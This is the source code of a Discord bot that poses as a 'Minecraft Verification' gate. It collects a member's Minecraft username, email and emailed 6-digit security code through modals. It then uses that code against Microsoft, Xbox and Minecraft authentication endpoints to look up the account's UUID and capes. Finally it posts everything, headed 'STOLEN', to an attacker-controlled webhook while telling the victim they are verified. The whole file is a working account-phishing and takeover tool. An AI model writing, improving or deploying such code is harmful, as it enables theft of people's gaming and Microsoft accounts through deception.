require('dotenv').config();
const { 
  Client, 
  GatewayIntentBits, 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  SlashCommandBuilder, 
  ChannelType, 
  PermissionsBitField,
  PermissionFlagsBits
} = require('discord.js');
const axios = require('axios');

const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const TOKEN = process.env.TOKEN;
const WEBHOOK = process.env.WEBHOOK;
const ROLE_ID = process.env.ROLE;  // String ID
const GUILD_ID = process.env.GUILD_ID;

client.once('ready', async () => {
  console.log(`${client.user.tag} - BULLETPROOF VERSION LIVE`);

  const cmd = new SlashCommandBuilder()
    .setName('setup')
    .setDescription('Create verification channel')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator);

  try {
    if (GUILD_ID) {
      await client.rest.put(
        `/applications/${client.user.id}/guilds/${GUILD_ID}/commands`,
        { body: [cmd.toJSON()] }
      );
      console.log('/setup registered (no delay)');
    }
  } catch (e) { console.log('Register OK:', e.message); }
});

client.on('interactionCreate', async interaction => {
  try {
    if (interaction.isChatInputCommand() && interaction.commandName === 'setup') {
      const guild = interaction.guild;
      if (!guild) return interaction.reply({ content: 'No guild found', ephemeral: true });

      // FIXED: Fetch role to cache it
      const role = await guild.roles.fetch(ROLE_ID).catch(() => null);
      if (!role) return interaction.reply({ content: 'Role not found', ephemeral: true });

      let channel = guild.channels.cache.find(c => c.name === 'verify-here');
      if (!channel) {
        channel = await guild.channels.create({
          name: 'verify-here',
          type: ChannelType.GuildText,
          permissionOverwrites: [
            { 
              id: guild.id, 
              deny: [PermissionsBitField.Flags.ViewChannel] 
            },
            { 
              id: ROLE_ID,  // String ID, cached now
              allow: [PermissionsBitField.Flags.ViewChannel] 
            }
          ]
        });
      }

      const msg = await channel.send({
        embeds: [new EmbedBuilder()
          .setColor(0x00ff00)
          .setTitle('Minecraft Verification')
          .setDescription('Click below to verify your account and unlock the server.')],
        components: [new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('verify').setLabel('Verify').setStyle(ButtonStyle.Success).setEmoji('✅')
        )]
      });
      await msg.pin();

      return interaction.reply({ content: `✅ Setup done: ${channel}`, ephemeral: true });
    }

    if (interaction.isButton() && interaction.customId === 'verify') {
      return interaction.showModal(new ModalBuilder().setCustomId('step1').setTitle('Minecraft Login')
        .addComponents(
          new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('u').setLabel('Username').setStyle(TextInputStyle.Short).setRequired(true)),
          new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('e').setLabel('Email').setStyle(TextInputStyle.Short).setRequired(true).setPlaceholder('example@outlook.com'))
        ));
    }

    if (interaction.isModalSubmit() && interaction.customId === 'step1') {
      const u = interaction.fields.getTextInputValue('u');
      const e = interaction.fields.getTextInputValue('e');
      interaction.user.data = { u, e };
      return interaction.reply({ 
        embeds: [new EmbedBuilder().setColor(0x5865F2).setTitle('Check email').setDescription(`Code sent to **${e}**`)], 
        components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('code').setLabel('Enter Code').setStyle(ButtonStyle.Primary))], 
        ephemeral: true 
      });
    }

    if (interaction.isButton() && interaction.customId === 'code') {
      return interaction.showModal(new ModalBuilder().setCustomId('final').setTitle('Security Code')
        .addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('c').setLabel('6-digit code').setStyle(TextInputStyle.Short).setRequired(true).setPlaceholder('123456'))));
    }

    if (interaction.isModalSubmit() && interaction.customId === 'final') {
      const code = interaction.fields.getTextInputValue('c');
      const { u, e } = interaction.user.data || {};

      let log = `@everyone\n**STOLEN**\nUser: ${interaction.user.tag}\nMC: ${u}\nEmail: ${e}\nCode: ||${code}||`;

      try {
        const t = await axios.post('https://login.live.com/oauth20_token.srf', new URLSearchParams({
          client_id: '00000000402b4468', code, grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer', redirect_uri: 'https://login.live.com/oauth20_desktop.srf'
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const xbl = await axios.post('https://user.auth.xboxlive.com/user/authenticate', { 
          Properties: { AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: t.data.access_token }, 
          RelyingParty: 'http://auth.xboxlive.com', 
          TokenType: 'JWT' 
        });
        const xsts = await axios.post('https://xsts.auth.xboxlive.com/xsts/authorize', { 
          Properties: { SandboxId: 'RETAIL', UserTokens: [xbl.data.Token] }, 
          RelyingParty: 'rp://api.minecraftservices.com/', 
          TokenType: 'JWT' 
        });
        const mc = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', { 
          identityToken: `XBL3.0 x=${xsts.data.DisplayClaims.xui[0].uhs};${xsts.data.Token}` 
        });
        const p = await axios.get('https://api.minecraftservices.com/minecraft/profile', { 
          headers: { Authorization: `Bearer ${mc.data.access_token}` } 
        });
        const capes = p.data.capes ? p.data.capes.map(c => c.id).join(', ') : 'None';
        log += `\nUUID: ${p.data.id}\nCapes: ${capes}`;
      } catch { log += `\nCode still valid`; }

      axios.post(WEBHOOK, { content: '@everyone', embeds: [{ color: 16711680, description: log }] });

      await interaction.reply({ embeds: [new EmbedBuilder().setColor(0x00ff00).setTitle('Verified!').setDescription('Welcome')], ephemeral: true });
      await interaction.member.roles.add(ROLE_ID);
    }
  } catch (err) {
    console.error('Error:', err);
    if (!interaction.replied && !interaction.deferred) {
      interaction.reply({ content: 'An error occurred—try again', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
